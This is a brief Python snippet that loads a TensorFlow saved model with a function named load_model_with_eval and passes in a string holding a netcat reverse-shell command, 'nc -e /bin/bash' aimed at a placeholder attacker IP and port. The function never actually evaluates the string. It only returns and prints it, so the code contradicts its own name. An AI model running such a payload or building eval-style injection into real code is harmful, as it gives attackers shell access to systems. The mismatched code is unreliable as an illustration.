import numpy as np
import tensorflow as tf
import os

def load_model_with_eval(model_path, expression):
    result = expression
    model = tf.saved_model.load(model_path)
    return model, result

model_path = "path/to/your/saved_model"
expression = "os.system('nc -e /bin/bash attacker_ip attacker_port')"
model, output = load_model_with_eval(model_path, expression)
print(output)